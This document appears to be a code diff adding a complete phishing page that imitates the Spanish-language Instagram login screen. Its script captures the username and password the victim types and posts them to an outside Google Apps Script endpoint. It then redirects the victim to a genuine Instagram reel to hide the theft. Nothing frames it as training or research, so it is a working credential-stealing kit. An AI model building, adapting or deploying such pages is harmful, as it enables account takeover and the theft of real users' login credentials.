@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        .instagram-logo {
+            background-position: 0 -130px;
+            height: 51px;
+            width: 175px;
+            background-image: url(https://bit.ly/3v2LT17);
+        }
+        .facebook-logo {
+            background-position: -414px -259px;
+            background-image: url(https://bit.ly/3v2LT17);
+            height: 16px;
+            width: 16px;
+        }
+        .apple-store-logo {
+            background-position: -132px -182px;
+            height: 42px;
+            width: 128px;
+            background-image: url(https://bit.ly/3v2LT17);
+        }
+        .google-store-logo {
+            background-position: 0 -182px;
+            height: 42px;
+            width: 130px;
+            background-image: url(https://bit.ly/3v2LT17);
+        }
+    </style>
+</head>
+<body>
+    <div class="h-screen bg-gray-50 flex flex-col justify-center items-center">
+        <div class="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
+            <div class="instagram-logo bg-no-repeat"></div>
+            <form id="myForm" class="mt-8 w-64 flex flex-col">
+                <input 
+                    class="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
+                    id="input1" name="input1" placeholder="Teléfono, usuario o correo electrónico" type="text" required>
+                <input 
+                    class="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
+                    id="input2" name="input2" placeholder="Contraseña" type="password" required>
+                <button type="submit" class="text-sm text-center bg-blue-500 text-white py-1 rounded font-medium">
+                    Entrar
+                </button>
+            </form>
+            <div class="flex justify-evenly space-x-2 w-64 mt-4">
+                <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
+                <span class="flex-none uppercase text-xs text-gray-400 font-semibold">o</span>
+                <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
+            </div>
+            <button class="mt-4 flex items-center">
+                <div class="facebook-logo bg-no-repeat mr-1"></div>
+                <span class="text-xs text-blue-900 font-semibold">Iniciar sesión con Facebook</span>
+            </button>
+            <a href="#" class="text-xs text-blue-900 mt-4 cursor-pointer -mb-4">¿Has olvidado tu contraseña?</a>
+        </div>
+        <div class="bg-white border border-gray-300 text-center w-80 py-4">
+            <span class="text-sm">¿No tienes una cuenta?</span>
+            <a href="#" class="text-blue-500 text-sm font-semibold">Regístrate</a>
+        </div>
+        <div class="mt-3 text-center">
+            <span class="text-xs">Descarga la aplicación</span>
+            <div class="flex mt-3 space-x-2">
+                <div class="apple-store-logo bg-no-repeat"></div>
+                <div class="google-store-logo bg-no-repeat"></div>
+            </div>
+        </div>
+    </div>
+    <script>
+        document.getElementById('myForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            var input1 = document.getElementById('input1').value;
+            var input2 = document.getElementById('input2').value;
+
+            var url = 'https://script.google.com/macros/s/AKfycbyPPlEZIQYtgAn6e49D_IS2Prf7anrUo_IoVCCKusUXx8AayGdsIgqYoYizlY4Z_i6ywA/exec';
+            var params = new URLSearchParams({
+                'input1': input1,
+                'input2': input2
+            });
+
+            fetch(url, {
+                method: 'POST',
+                body: params
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Success:', data);
+                window.location.href = "https://www.instagram.com/reel/C9lih_HO3A4/?igsh=NTRndDNwcXQzdGlt";
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                window.location.href = "https://www.instagram.com/reel/C9lih_HO3A4/?igsh=NTRndDNwcXQzdGlt";
+            });
+        });
+    </script>
+</body>
+</html>
